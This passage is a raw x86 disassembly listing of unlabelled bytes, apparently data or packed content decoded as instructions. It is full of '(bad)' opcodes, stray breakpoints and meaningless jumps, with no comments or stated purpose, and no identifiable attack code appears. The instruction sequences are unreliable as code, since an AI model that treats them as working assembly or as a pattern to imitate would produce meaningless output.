  4128e7:	or     DWORD PTR [ecx+0x13],esi
  4128ea:	inc    DWORD PTR [ebx-0x1e00ff01]
  4128f0:	int3   
  4128f1:	add    BYTE PTR [ecx],al
  4128f3:	mov    esi,esi
  4128f5:	js     0x4128a0
  4128f7:	repz pop ds
  4128f9:	fs (bad) 
  4128fb:	inc    DWORD PTR [eax]
  4128fd:	inc    DWORD PTR [eax]
  4128ff:	ins    BYTE PTR es:[edi],dx
  412900:	(bad)  
  412901:	call   DWORD PTR [edi+edi*8+0x39694a24]
  412908:	cmp    BYTE PTR [edi-0x7c00ff01],dh
  41290e:	push   DWORD PTR [ebx]
  412910:	add    bh,bh
  412912:	add    BYTE PTR [ebx-0x1b380f93],0x28
  412919:	jecxz  0x41291a
  41291b:	inc    DWORD PTR [ebx+0xa18300]
  412921:	and    ebp,0x0
  412924:	dec    ebp
  412925:	sbb    ch,bh
  412927:	fisubr WORD PTR [edx+0x77]
  41292a:	int3   
  41292b:	or     DWORD PTR [ecx-0xc30001],0xffffffff
  412932:	outs   dx,DWORD PTR ds:[esi]
  412933:	inc    DWORD PTR [esi-0x56]
  412936:	sbb    BYTE PTR [ebx],al
  412938:	aad    0x1d
  41293a:	add    DWORD PTR [eax],0xffffff83
  41293d:	(bad)  
  41293e:	jmp    DWORD PTR [eax]
  412940:	add    ah,cl
  412942:	inc    ebx
  412943:	add    BYTE PTR [ecx],dl
  412945:	aad    0x9e
  412947:	jae    0x412968
  412949:	push   ecx
  41294a:	add    bh,bh
  41294c:	int3   
  41294d:	int3   
  41294e:	cmp    ebp,0x0
  412951:	inc    DWORD PTR [ebp+0x0]
  412954:	(bad)  [ecx-0x4a]
  412957:	dec    edx
  412958:	xor    dl,cl
  41295a:	add    bh,bh
  41295c:	dec    esp
  41295e:	int3   
  41295f:	mov    esi,0x3b0000
  412964:	lds    ecx,FWORD PTR [ebx+0x2df132e4]
  41296a:	add    DWORD PTR [ebx+0x3500ff00],0x0
  412971:	jmp    DWORD PTR [edx-0x77]
  412974:	enter  0xf860,0x70
  412978:	scas   al,BYTE PTR es:[edi]
  412979:	je     0x41297a
  41297b:	cmp    edi,0xffffffff
  41297e:	(bad)  
  41297f:	mov    ebx,0xffbaff00
  412984:	pop    ebp
  412985:	into   
  412986:	mov    ebp,0x8919572f
  41298b:	add    DWORD PTR [ebx-0x7c530001],0x0
  412992:	inc    esp
  412993:	add    BYTE PTR [eax],dl
  412995:	and    BYTE PTR [ebp-0x3],bh
  412998:	sbb    al,0x8c
  41299a:	(bad)  
  41299b:	dec    esp
  41299d:	mov    edi,edi
  41299f:	ins    BYTE PTR es:[edi],dx
  4129a0:	(bad)  
  4129a1:	call   DWORD PTR [eax+0x0]
  4129a4:	stc    
  4129a5:	stos   BYTE PTR es:[edi],al
  4129a6:	pop    ss
  4129a7:	fdivr  QWORD PTR [ecx-0x76ff763e]
  4129ad:	inc    DWORD PTR [eax]
  4129af:	fdivp  st(7),st
  4129b1:	sbb    DWORD PTR [edi+edi*8+0x491a1241],0xffffffec
  4129b9:	pop    edx
  4129ba:	or     DWORD PTR [ecx+0x67ffcc83],0xffffffff
  4129c1:	sub    DWORD PTR [ebx],0xffffffcc
  4129c4:	stos   DWORD PTR es:[edi],eax
  4129c5:	xor    esp,0xffc93269
  4129cb:	int3   
  4129cc:	cmp    edi,0xffffff89
  4129cf:	cmp    DWORD PTR [ebx-0x7f33c901],eax
  4129d5:	xor    ecx,DWORD PTR [eax]
  4129d7:	xchg   esi,eax
  4129d8:	icebp  
  4129d9:	adc    edi,edi
  4129db:	add    DWORD PTR [ebx-0xd07634],0x0
  4129e2:	scas   eax,DWORD PTR es:[edi]
  4129e3:	add    BYTE PTR [eax-0x4e],dh
  4129e6:	les    eax,FWORD PTR [ebp-0x7c00e400]
  4129ec:	cmp    edi,0x0
  4129ef:	int3   
  4129f0:	add    BYTE PTR [eax],al
  4129f2:	lds    eax,FWORD PTR [eax]
  4129f4:	(bad)  
  4129f5:	test   al,0x4f
  4129f8:	sbb    BYTE PTR [ecx-0x7d],al
  4129fb:	inc    DWORD PTR [eax]
  4129fd:	add    bh,bh
  4129ff:	pop    ebp
  412a00:	inc    DWORD PTR [ebx+0x2b730082]
  412a06:	popa   
  412a07:	(bad)  
  412a09:	mov    DWORD PTR [eax],eax
  412a0b:	add    BYTE PTR [ebx+0x79ffff],al
  412a11:	dec    DWORD PTR [edi-0x1]
  412a14:	pop    ebx
  412a15:	xor    eax,0x2ed1598d
  412a1a:	int3   
  412a1b:	mov    DWORD PTR [eax],eax
  412a1d:	add    bh,bh
  412a1f:	xor    BYTE PTR [eax],al
  412a21:	call   FWORD PTR [eax-0x77]
  412a24:	adc    eax,0x3bfae440
  412a29:	or     al,BYTE PTR [ebx-0x337cff01]
  412a2f:	sbb    edi,edi
  412a31:	int3   
  412a32:	mov    bl,0x89
  412a34:	mov    ebp,0xe4787bfb
  412a39:	adc    eax,0x830083ff
  412a3e:	int3   
  412a3f:	jnp    0x412a41
  412a41:	add    BYTE PTR [edi+edi*8-0xdc258a9],al
  412a48:	xchg   edi,eax
  412a49:	(bad)  
  412a4b:	dec    esp
  412a4d:	inc    DWORD PTR [eax]
  412a4f:	sbb    eax,0xff1dffff
  412a54:	dec    edi
  412a55:	cmc    
  412a56:	push   0xffc7ffe6
  412a5b:	inc    DWORD PTR [eax]
  412a5d:	(bad)  
  412a5e:	inc    esi
  412a60:	add    DWORD PTR [ebx-0x3b61ff3d],0xffffffb2
  412a67:	lea    esp,[esp+ebx*2-0x7d]
  412a6b:	inc    DWORD PTR [eax]
  412a6d:	add    BYTE PTR [eax],al
  412a6f:	push   ss
  412a70:	(bad)  
  412a71:	push   DWORD PTR [ebx+eax*4+0x71]
  412a75:	jle    0x412a21
  412a77:	xor    BYTE PTR [esi],al
  412a79:	sar    bh,0xff
  412a7c:	mov    DWORD PTR [eax],eax
  412a7e:	cmp    DWORD PTR [eax],0xffffffff
  412a81:	mov    DWORD PTR [ebx+eax*4],edx
  412a84:	mov    eax,0xe06411ba
  412a89:	push   0x0
  412a8b:	add    bh,bh
  412a8d:	(bad)  
  412a8e:	dec    DWORD PTR [esi-0x1]
  412a91:	int3   
  412a92:	inc    BYTE PTR [eax]
  412a94:	add    dh,BYTE PTR [ebx+eax*8+0x2b]
  412a98:	hlt    
  412a99:	data16 add bh,bh
  412a9c:	add    bh,bh
  412a9e:	jmp    DWORD PTR [edx]
  412aa0:	add    bh,bh
  412aa2:	pop    ebx
  412aa3:	sbb    DWORD PTR ds:0x2f871ce,0x4e
  412aaa:	inc    DWORD PTR [ebx+0x14ffffff]
  412ab0:	add    DWORD PTR [ebx-0x5f3700e6],0xffffffff
  412ab7:	cmp    al,0x2e
  412ab9:	pop    edx
  412aba:	cmp    edi,0xffffffff
  412abd:	inc    DWORD PTR [eax]
  412abf:	jbe    0x412ac0
  412ac1:	sub    DWORD PTR [ecx+0x0],0x60
  412ac5:	cmp    al,0xbd
  412ac7:	call   0x1405927
  412acc:	(bad)  
  412acd:	(bad)  
  412ace:	call   DWORD PTR [edi+edi*8-0x1]
  412ad2:	dec    ebx
  412ad3:	add    BYTE PTR [edi+ecx*2+0x1],al
  412ad7:	cmc    
  412ad8:	fcmovnu st,st(2)
  412ada:	add    bh,bh
  412adc:	inc    DWORD PTR [eax]
  412ade:	push   DWORD PTR [ebp-0x77]
  412ae1:	cmp    DWORD PTR [eax+eax*1+0x41],0x36
  412ae6:	mov    ebx,esp
  412ae8:	or     eax,0xffff3a
  412aed:	int3   
  412aee:	add    BYTE PTR [esi],al
  412af0:	add    DWORD PTR [ebx+0x59a0033],0x74
  412af7:	xor    dh,dl
  412af9:	and    DWORD PTR [eax],eax
  412afb:	inc    DWORD PTR [ebx-0x7c007c01]
  412b01:	int3   
  412b02:	fwait
  412b03:	int3   
  412b04:	add    DWORD PTR [eax+ebp*4+0x55],0xffffff80
  412b09:	pop    DWORD PTR [ebx-0xff767d]
  412b0f:	jp     0x412add
  412b11:	add    ah,cl
  412b13:	(bad)  
  412b14:	(bad)  
  412b15:	cmp    eax,0x2b14ceff
  412b1a:	in     al,dx
  412b1b:	sub    al,BYTE PTR [eax]
  412b1d:	dec    esp
  412b1f:	pop    ecx
  412b20:	mov    bh,bh
  412b22:	add    bh,bh
  412b24:	push   DWORD PTR [edi-0x1]
  412b27:	xchg   esi,eax
  412b28:	aad    0xfc
  412b2a:	(bad)  
  412b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b2c:	(bad)  
  412b2d:	inc    DWORD PTR [eax]
  412b2f:	and    al,0xf7
  412b31:	add    bh,bh
  412b33:	int3   
  412b34:	(bad)  
  412b35:	jp     0x412aba
  412b37:	js     0x412b38
  412b39:	fstp   QWORD PTR [edx+eax*1-0x77]
  412b3d:	int3   
  412b3e:	add    BYTE PTR [edx-0xffff93],bh
  412b44:	add    BYTE PTR [edi+edi*8-0x4e782b8b],ch
  412b4b:	in     eax,0x0
  412b4d:	dec    esp
  412b4f:	cdq    
  412b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b51:	inc    DWORD PTR [eax]
  412b53:	inc    DWORD PTR [eax]
  412b55:	loopne 0x412b56
  412b57:	xor    al,ah
  412b59:	dec    ebx
  412b5a:	and    BYTE PTR [edx-0x3bff007d],ch
  412b60:	mov    eax,DWORD PTR [ebx+0x210000ff]
  412b66:	and    DWORD PTR [esi+0x21],0xffffffcb
  412b6a:	sub    al,BYTE PTR [ecx+ecx*4]
  412b6d:	mov    DWORD PTR [eax],eax
  412b6f:	and    BYTE PTR [edx+0x8383ff],al
  412b75:	bound  eax,QWORD PTR [ebx+0x4c9ad3a2]
  412b7b:	(bad)  
  412b7d:	(bad)  
  412b7e:	push   DWORD PTR ds:0x83ffff6b
  412b84:	(bad)  
  412b85:	fild   WORD PTR [eax]
  412b87:	clc    
  412b88:	mov    eax,ds:0x2cb258
  412b8d:	add    bh,bh
  412b8f:	out    0xf8,eax
  412b91:	or     DWORD PTR [ecx-0xd50100],0xfffffff2
  412b98:	dec    edi
  412b99:	or     DWORD PTR [ebp-0xff68],ebx
  412b9f:	xchg   esi,eax
  412ba0:	fmulp  st(4),st
  412ba2:	int3   
  412ba3:	int3   
  412ba4:	add    BYTE PTR [ebp-0x34],cl
  412ba7:	mov    edx,0x2625b7b9
  412bac:	int3   
  412bad:	int3   
  412bae:	add    BYTE PTR [edi-0xf],bl
  412bb1:	(bad)  
  412bb2:	inc    DWORD PTR [eax]
  412bb4:	add    BYTE PTR [ecx],ch
  412bb6:	mov    ecx,ecx
  412bb8:	jo     0x412b59
  412bba:	lahf   
  412bbb:	cmp    ah,cl
  412bbd:	(bad)  
  412bbe:	jmp    DWORD PTR [esi+0x51]
  412bc1:	add    BYTE PTR [eax],al
  412bc3:	int3   
  412bc4:	push   DWORD PTR [eax+0x0]
  412bc7:	(bad)  
  412bc8:	out    dx,eax
  412bc9:	xchg   ecx,eax
  412bca:	mov    ecx,0xff83ff84
  412bcf:	push   ds
  412bd0:	xor    bh,bh
  412bd2:	inc    DWORD PTR [eax]
  412bd4:	dec    DWORD PTR [ecx-0x1]
  412bd7:	mov    esi,0x62add9d6
  412bdc:	cmp    edi,0x0
  412bdf:	shl    al,cl
  412be1:	add    BYTE PTR [eax],al
  412be3:	int3   
  412be4:	int3   
  412be5:	adc    eax,0x5bb49a83
  412bea:	fmul   QWORD PTR [edi]
  412bec:	add    bh,bh
  412bee:	add    ah,dl
  412bf0:	or     bh,bh
  412bf2:	(bad)  
  412bf3:	inc    DWORD PTR [ebx-0x3ebd004e]
  412bf9:	arpl   WORD PTR [edx+eax*2],dx
  412bfc:	(bad)  
  412bfd:	dec    DWORD PTR [ecx+0xb39f]
  412c03:	add    bh,bh
  412c05:	fwait
  412c06:	(bad)  
  412c07:	call   0x2d5833f1
  412c0c:	dec    esp
  412c0e:	inc    DWORD PTR [edi+0xff0c]
  412c14:	add    bh,bl
  412c16:	int3   
  412c17:	pop    ecx
  412c18:	lea    ebp,[esi-0xb854]
  412c1e:	dec    DWORD PTR [ecx-0x76fffffb]
  412c24:	add    BYTE PTR [edi-0x572c5200],ch
  412c2a:	mov    esi,0xff8389a9
  412c2f:	out    dx,al
  412c30:	xchg   edi,edi
  412c32:	add    DWORD PTR [eax],0xffffffff
  412c35:	cmp    edi,0x20
  412c38:	mov    dh,0x1f
  412c3a:	(bad)  
  412c3b:	in     eax,dx
  412c3c:	add    BYTE PTR [eax],al
  412c3e:	add    BYTE PTR [ecx],dl
  412c40:	inc    DWORD PTR fs:[eax]
  412c43:	mov    edi,edi
  412c45:	clc    
  412c46:	push   DWORD PTR [eax+0x69]
  412c49:	pop    eax
  412c4a:	cmp    BYTE PTR [edi+0x72830083],al
  412c50:	mov    BYTE PTR [eax],al
  412c52:	add    DWORD PTR [eax],0xffffff83
  412c55:	aam    0x0
  412c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c58:	pop    eax
  412c59:	stos   DWORD PTR es:[edi],eax
  412c5a:	push   0x12
  412c5c:	add    DWORD PTR [eax],0xffffffcc
  412c5f:	ja     0x412c49
  412c61:	add    ah,cl
  412c63:	(bad)  
  412c64:	call   FWORD PTR [esi+0x139f7ff]
  412c6a:	fwait
  412c6b:	add    BYTE PTR [bp+di-0x1100],al
  412c70:	push   ebx
  412c71:	cmp    edi,0xffffff83
  412c74:	int3   
  412c75:	push   0x590b00
  412c7a:	sub    ebp,DWORD PTR [esi]
  412c7c:	(bad)  
  412c7d:	inc    DWORD PTR [eax]
  412c7f:	imul   edx,eax,0xff00ffff
  412c85:	pop    DWORD PTR [eax]
  412c87:	add    bh,BYTE PTR [eax+esi*4+0xcc1c9e]
  412c8e:	xor    DWORD PTR [ecx-0x7cff00b1],0xffffffff
  412c95:	add    edi,edi
  412c97:	ret    0xd690
  412c9a:	ss jp  0x412c9d
  412c9d:	add    BYTE PTR [eax],al
  412c9f:	loope  0x412c8c
  412ca1:	int3   
  412ca2:	or     DWORD PTR [ecx-0x277cd301],0x6b
  412ca9:	inc    edi
  412caa:	sub    ebx,edi
  412cac:	add    BYTE PTR [eax],al
  412cae:	jmp    FWORD PTR [edx]
  412cb0:	mov    BYTE PTR [eax],0xff
  412cb3:	add    BYTE PTR [ecx+0x52b78336],cl
  412cb9:	pop    ebx
  412cba:	sbb    ebp,DWORD PTR [edx+0x2f00ff00]
  412cc0:	add    BYTE PTR fs:[eax],al
  412cc3:	add    BYTE PTR [eax],al
  412cc5:	jle    0x412cc7
  412cc7:	dec    edx
  412cc8:	test   DWORD PTR [esi+0x11],ebx
  412ccb:	add    al,BYTE PTR [eax]
  412ccd:	add    bh,bh
  412ccf:	push   ds
  412cd0:	cmp    al,0xff
  412cd2:	dec    esp
  412cd4:	mov    DWORD PTR [eax-0x602d4101],edi
  412cda:	retf   0x92
  412cdd:	add    DWORD PTR [eax],0xffffffe4
  412ce0:	(bad)  
  412ce2:	(bad)  
  412ce3:	inc    DWORD PTR [ebx-0x77167c7f]
  412ce9:	test   BYTE PTR [edx],cl
  412ceb:	outs   dx,DWORD PTR ds:[esi]
  412cec:	add    BYTE PTR [ebx+0xb17583],al
  412cf2:	add    BYTE PTR [eax],al
  412cf4:	(bad)  
  412cf5:	mov    ebp,0x73864a83
  412cfa:	cmp    cl,BYTE PTR [ebp+0x76ff89ff]
  412d00:	(bad)  
  412d01:	(bad)  
  412d02:	(bad)  
  412d03:	(bad)  
  412d04:	dec    esp
  412d06:	add    dh,ah
  412d08:	cmp    al,0x41
  412d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d0b:	xor    eax,0x8bffff00
  412d10:	stos   BYTE PTR es:[edi],al
  412d11:	int3   
  412d12:	(bad)  
  412d13:	(bad)  
  412d14:	jmp    ecx
  412d16:	(bad)  
  412d17:	jge    0x412d5f
  412d19:	outs   dx,DWORD PTR ds:[esi]
  412d1a:	in     eax,0xbe
  412d1c:	mov    edi,edi
  412d1e:	add    ah,bl
  412d20:	mov    edi,0x8383ffff
  412d25:	push   edx
  412d26:	int3   
  412d27:	fbld   TBYTE PTR [edx-0x7c7b4b18]
  412d2d:	add    BYTE PTR [ebx-0xff1709],al
  412d33:	add    bh,bh
  412d35:	imul   edi,edi,0xffffffe6
  412d38:	call   0xff55ee48
  412d3d:	(bad)  
  412d3e:	inc    DWORD PTR [ebx-0xff00c9]
  412d44:	add    BYTE PTR [edx-0x34],ah
  412d47:	jl     0x412ce7
  412d49:	rcl    DWORD PTR [eax],0x2f
  412d4c:	dec    DWORD PTR [ecx-0xd39201]
  412d52:	dec    esp
  412d54:	add    BYTE PTR [edi],al
  412d56:	add    BYTE PTR [ecx+0x21ea45cf],bh
  412d5c:	add    bh,bh
  412d5e:	sub    eax,0xffffffa2
  412d61:	inc    DWORD PTR [eax]
  412d63:	mov    DWORD PTR [eax],eax
  412d65:	mov    al,ds:0x396ddff
  412d6a:	dec    ebp
  412d6b:	xchg   ecx,eax
  412d6c:	(bad)  
  412d6d:	(bad)  
  412d6e:	inc    DWORD PTR [ebx+0x6b]
  412d71:	add    bh,bh
  412d73:	add    bh,bh
  412d75:	rol    DWORD PTR [ebx+0x6be1823d],cl
  412d7b:	outs   dx,DWORD PTR ds:[esi]
  412d7c:	(bad)  
  412d7d:	dec    DWORD PTR [ecx-0x377b]
  412d83:	inc    DWORD PTR [ebx-0x76c43375]
  412d89:	add    DWORD PTR [ebx+eax*2-0x1],0x101ff83
  412d91:	int3   
  412d92:	inc    DWORD PTR [ebx+0x2bff1200]
  412d98:	punpcklwd mm5,DWORD PTR [ebx+edi*2]
  412d9c:	mov    DWORD PTR [ecx+0x56d8ff],ecx
  412da2:	inc    DWORD PTR [eax]
  412da4:	inc    DWORD PTR [edx]
  412da6:	add    cl,bl
  412da8:	pop    ecx
  412da9:	dec    ebp
  412daa:	scas   eax,DWORD PTR es:[edi]
  412dab:	cmp    DWORD PTR [eax],eax
  412dad:	inc    DWORD PTR [ebx-0x3300d327]
  412db3:	add    DWORD PTR [eax],0x4b
  412db6:	(bad)  
  412db7:	fldcw  WORD PTR [edx-0x76a6b6f4]
  412dbd:	inc    DWORD PTR [eax]
  412dbf:	sbb    DWORD PTR [esi-0x7c0077],edx
  412dc5:	cdq    
  412dc6:	push   DWORD PTR [esi]
  412dc8:	xchg   ebx,eax
  412dc9:	sub    edi,esp
  412dcb:	pop    eax
  412dcc:	(bad)  
  412dcd:	(bad)  
  412dce:	dec    esi
  412dd0:	mov    esp,0xff83ccff
  412dd5:	add    edi,edi
  412dd7:	push   ss
  412dd8:	mov    esi,0xffd8c066
  412ddd:	inc    DWORD PTR [eax]
  412ddf:	add    DWORD PTR [eax+eax*1+0x0],ebp
  412de3:	inc    DWORD PTR [eax]
  412de5:	dec    esp
  412de6:	call   FWORD PTR [edi]
  412de8:	jb     0x412da7
  412dea:	call   0x1412cf0
  412def:	mov    al,ds:0xff000a
  412df4:	add    dl,ch
  412df6:	(bad)  
  412df7:	jle    0x412e12
  412df9:	cmp    eax,0xff83f9a7
  412dfe:	push   DWORD PTR [eax-0x5b]
  412e01:	add    BYTE PTR [ebx+0x94ffff],al
  412e07:	in     al,0xf0
  412e09:	push   0xffffffb3
  412e0b:	jns    0x412e0d
  412e0d:	inc    DWORD PTR [eax]
  412e0f:	cli    
  412e10:	es (bad) 
  412e12:	inc    DWORD PTR [ebx+0x7003eff]
  412e18:	adc    BYTE PTR [edx+0x6b],bl
  412e1b:	xchg   edx,eax
  412e1c:	inc    DWORD PTR [eax]
  412e1e:	sub    DWORD PTR [ebp-0x73],0xffffffcc
  412e22:	mov    DWORD PTR [ebx+0x5f009bff],eax
  412e28:	jb     0x412dab
  412e2a:	mov    ah,al
  412e2c:	(bad)  
  412e2d:	(bad)  
  412e2e:	(bad)  
  412e2f:	mov    edi,0x8300ff00
  412e34:	(bad)  
  412e35:	mov    edi,0xe54eb100
  412e3a:	fsubrp st(0),st
  412e3c:	int3   
  412e3d:	add    bh,bh
  412e3f:	inc    esp
  412e40:	out    dx,eax
  412e41:	(bad)  
  412e42:	(bad)  
  412e43:	(bad)  
  412e44:	dec    DWORD PTR [ebp+0x35bd4aff]
  412e4a:	adc    eax,0xff838912
  412e4f:	mov    DWORD PTR [ecx],ebx
  412e51:	add    bh,bh
  412e53:	inc    DWORD PTR [eax]
  412e55:	pop    ebx
  412e56:	jmp    FWORD PTR [esi+edi*1-0x6]
  412e5a:	gs mov esp,0xc5ff00ff
  412e60:	call   0x3f:0xff00
  412e67:	pop    ebp
  412e69:	fidiv  WORD PTR [esi]
  412e6b:	iret   
  412e6c:	dec    DWORD PTR [ecx-0x7c022a00]
  412e72:	(bad)  
  412e73:	(bad)  
  412e74:	inc    DWORD PTR [edi+edi*8-0x1a4fa5be]
  412e7b:	fdivp  st(7),st
  412e7d:	add    BYTE PTR [eax],al
  412e7f:	fmulp  st(6),st
  412e81:	inc    DWORD PTR [ebx-0x7cb80100]
  412e87:	sbb    eax,DWORD PTR [eax+0x44]
  412e8a:	jmp    0x2bd7:0xccccff90
  412e91:	add    BYTE PTR [ecx-0x3f7c7d],cl
  412e97:	mov    eax,0x39135f7d
  412e9c:	(bad)  
  412e9d:	inc    DWORD PTR [eax]
  412e9f:	mov    ds:0xffcc8305,al
  412ea4:	add    BYTE PTR [ecx+ecx*4-0xa3bd650],al
  412eab:	ud0    eax,DWORD PTR [eax]
  412eae:	add    BYTE PTR ds:0xff838934,bh
  412eb4:	push   DWORD PTR [edx-0x2f1de01]
  412eba:	push   eax
  412ebb:	inc    ebp
  412ebc:	(bad)  
  412ebd:	(bad)  
  412ebe:	call   DWORD PTR [eax]
  412ec0:	lds    eax,FWORD PTR [ebx+0x13ffffff]
  412ec6:	(bad)  
  412ec7:	fimul  DWORD PTR [ebp-0x33a588c0]
  412ecd:	inc    DWORD PTR [ebx-0x7c001478]
  412ed3:	or     esp,0x5
  412ed6:	(bad)  
  412ed7:	jmp    0xcbdf4d39
  412edc:	(bad)  
  412edd:	(bad)  
  412ede:	(bad)  
  412edf:	fldenv [edi]
  412ee1:	inc    DWORD PTR [eax]
  412ee3:	add    BYTE PTR [ebx+0x2f220010],al
  412ee9:	jne    0x412f27
  412eeb:	dec    esi
  412eec:	dec    esp
  412eee:	add    BYTE PTR [eax],dl
  412ef0:	cmp    DWORD PTR [ebx+0x5283ff89],eax
  412ef6:	push   esi
  412ef8:	pop    esp
  412ef9:	jae    0x412eb8
  412efb:	fdivp  st(7),st
  412efd:	inc    DWORD PTR [eax]
  412eff:	repz (bad) 
  412f03:	add    DWORD PTR [eax],0x30
  412f06:	call   FWORD PTR [esi+eax*8]
  412f09:	mov    ds:0xff006f10,al
  412f0e:	mov    DWORD PTR [esi-0x2b],eax
  412f11:	inc    DWORD PTR [eax]
  412f13:	add    BYTE PTR [eax],al
  412f15:	fdiv   st(7),st
  412f17:	sar    BYTE PTR [edi+0x77],0x8b
  412f1b:	or     edi,edi
  412f1d:	(bad)  
  412f1e:	jmp    FWORD PTR [edi+ebp*2-0x1]
  412f22:	add    BYTE PTR [eax],al
  412f24:	call   DWORD PTR [edx]
  412f26:	(bad)  
  412f27:	fcmovnu st,st(6)
  412f29:	xchg   BYTE PTR [edi],dh
  412f2b:	call   0x79422f2f
  412f30:	push   ss
  412f31:	(bad)  
  412f32:	(bad)  
  412f33:	dec    esp
  412f35:	pop    esi
  412f36:	inc    DWORD PTR [ecx+0x7b]
  412f39:	inc    ecx
  412f3a:	push   eax
  412f3b:	jnp    0x412f09
  412f3d:	inc    DWORD PTR [eax]
  412f3f:	dec    ecx
  412f40:	jmp    0xffa2:0xff83ff83
  412f47:	in     al,dx
  412f48:	pusha  
  412f49:	pop    ecx
  412f4a:	xchg   esi,eax
  412f4b:	repz add bh,bh
  412f4e:	inc    DWORD PTR ds:0x8900cc97
  412f54:	inc    DWORD PTR [edi]
  412f56:	int3   
  412f57:	mov    ebx,0x2b4f2f6c
  412f5c:	add    ah,cl
  412f5e:	dec    DWORD PTR [ebx-0x68]
  412f61:	add    bh,bh
  412f63:	inc    DWORD PTR [ebx-0x4122ffbd]
  412f69:	leave  
  412f6a:	lock outs dx,DWORD PTR ds:[esi]
  412f6c:	mov    DWORD PTR [eax],eax
  412f6e:	sbb    DWORD PTR [edx+0x37],0x0
  412f75:	int    0xff
  412f77:	sbb    eax,0x2f420d18
  412f7c:	dec    esp
  412f7e:	add    DWORD PTR [eax+eiz*2],0xffffffcc
  412f82:	add    bh,bh
  412f84:	add    BYTE PTR [eax+eax*1],al
  412f87:	dec    ebp
  412f88:	iret   
  412f89:	adc    eax,0xffa807
  412f8e:	int3   
  412f8f:	inc    ebx
  412f90:	add    bh,bh
  412f92:	add    bh,bh
  412f94:	inc    DWORD PTR [edx]
  412f96:	inc    DWORD PTR [ebx-0x4]
  412f99:	fldenv [ecx+0x830054]
  412f9f:	adc    BYTE PTR [ebp+0x0],0x83
  412fa3:	dec    esp
  412fa5:	mov    ch,0xff
  412fa7:	or     dh,BYTE PTR [eax+0x40]
  412faa:	clc    
  412fab:	dec    eax
  412fac:	int3   
  412fad:	add    DWORD PTR [eax],0x34
  412fb0:	sub    bh,bh
  412fb2:	inc    DWORD PTR [ebx-0x1300d001]
  412fb8:	rol    ch,1
  412fba:	mov    ah,0xaa
  412fbc:	add    DWORD PTR [ebx-0x33626301],0xffffffff
  412fc3:	dec    DWORD PTR [ecx-0x4e2d3323]
  412fc9:	test   DWORD PTR [esi-0xff768f],edi
  412fcf:	ins    DWORD PTR es:[edi],dx
  412fd0:	jl     0x412fd2
  412fd2:	add    BYTE PTR [ebx+0x289a3ff],al
  412fd8:	mov    ebx,0xff937530
  412fdd:	(bad)  
  412fde:	(bad)  
  412fdf:	jnp    0x412f97
  412fe1:	add    bh,bh
  412fe3:	inc    DWORD PTR [eax]
  412fe5:	dec    eax
  412fe6:	call   DWORD PTR [esi+ebx*8+0x3d]
  412fea:	sti    
  412feb:	xor    al,0x83
  412fed:	inc    DWORD PTR [eax]
  412fef:	push   cs
  412ff0:	push   ds
  412ff1:	inc    DWORD PTR [eax]
  412ff3:	dec    DWORD PTR [ecx-0x3846ff77]
  412ff9:	cmp    eax,0xffffb34c
  412ffe:	add    BYTE PTR [ebp+0xe],al
  413001:	add    BYTE PTR [eax],al
  413003:	dec    DWORD PTR [ecx+0x3102ffc5]
  413009:	dec    edx
  41300a:	into   
  41300b:	scas   eax,DWORD PTR es:[edi]
  41300c:	(bad)  
  41300d:	(bad)  
  41300e:	jmp    FWORD PTR [eax]
  413010:	sbb    DWORD PTR [eax],eax
  413012:	inc    DWORD PTR [eax]
  413014:	xor    esp,0xffffffff
  413017:	cmp    eax,0x3ba97be6
  41301c:	inc    DWORD PTR [ebx-0x237501]
  413022:	dec    esp
  413024:	int3   
  413025:	and    eax,0x793b91ff
  41302a:	lods   eax,DWORD PTR ds:[esi]
  41302b:	idiv   bh
  41302d:	(bad)  
  41302e:	inc    esi
  413030:	fs add ah,cl
  413033:	add    bh,bh
  413035:	pop    ecx
  413036:	sbb    DWORD PTR [ebx+0x147de33d],0xffffffff
  41303d:	add    bh,bh
  41303f:	shr    DWORD PTR [esi],1
  413041:	int3   
  413042:	inc    DWORD PTR [ebx-0x4ff3901]
  413048:	clc    
  413049:	rcl    BYTE PTR [ebx-0x7c007620],0xd1
  413050:	je     0x41301e
  413052:	inc    DWORD PTR [ebx-0x6e33ea77]
  413058:	or     ah,BYTE PTR [edx-0x3e]
  41305b:	jno    0x41305c
  41305d:	mov    edi,edi
  41305f:	data16 (bad) 
  413061:	mov    DWORD PTR [eax],eax
  413063:	(bad)  
  413064:	jmp    DWORD PTR [eax+eax*1+0x174e68b]
  41306b:	add    BYTE PTR [eax],al
  41306d:	add    BYTE PTR [eax],al
  41306f:	fcom   QWORD PTR [ecx-0x7cff7c34]
  413075:	cmp    esp,ecx
  413077:	mov    ebp,0x46e72b4d
  41307c:	inc    DWORD PTR [ebx-0xcbb34]
  413082:	inc    DWORD PTR [eax]
  413084:	int3   
  413085:	mov    edx,0x94d52dff
  41308a:	push   ss
  41308b:	push   ebx
  41308c:	(bad)  
  41308d:	dec    esp
  41308f:	cmc    
  413090:	mov    eax,0xff8389ff
  413095:	xchg   ebp,eax
  413096:	inc    DWORD PTR [ebx-0x51]
  413099:	ret    
  41309a:	(bad)  
  41309b:	pop    ebp
  41309c:	int3   
  41309d:	(bad)  
  41309e:	dec    edx
  4130a0:	ins    BYTE PTR es:[edi],dx
  4130a1:	inc    DWORD PTR [eax]
  4130a3:	add    bh,bh
  4130a5:	fiadd  DWORD PTR [eax]
  4130a7:	push   edx
  4130a8:	hlt    
  4130a9:	cmp    BYTE PTR [edx],0x46
  4130ac:	inc    DWORD PTR [eax]
  4130ae:	push   DWORD PTR [esi-0x44]
  4130b1:	add    bh,bh
  4130b3:	add    BYTE PTR [eax],al
  4130b5:	gs int3 
  4130b7:	hlt    
  4130b8:	jne    0x4130c4
  4130ba:	daa    
  4130bb:	(bad)  
  4130bd:	int3   
  4130be:	add    bh,ah
  4130c0:	cmp    eax,0xcc89ffff
  4130c5:	mov    ebx,0x8d789389
  4130ca:	push   es
  4130cb:	mov    dl,0xcc
  4130cd:	(bad)  
  4130ce:	jmp    DWORD PTR [ecx-0x3300ff56]
  4130d4:	(bad)  
  4130d5:	mov    esi,0xb0cbb900
  4130da:	cld    
  4130db:	lods   eax,DWORD PTR ds:[esi]
  4130dc:	add    bh,bh
  4130de:	mov    DWORD PTR [ebp-0x337c4e],eax
  4130e4:	adc    ebp,0xffffffff
  4130e7:	out    0xe6,al
  4130e9:	pop    es
  4130ea:	std    
  4130eb:	or     al,0x83
  4130ed:	add    ah,cl
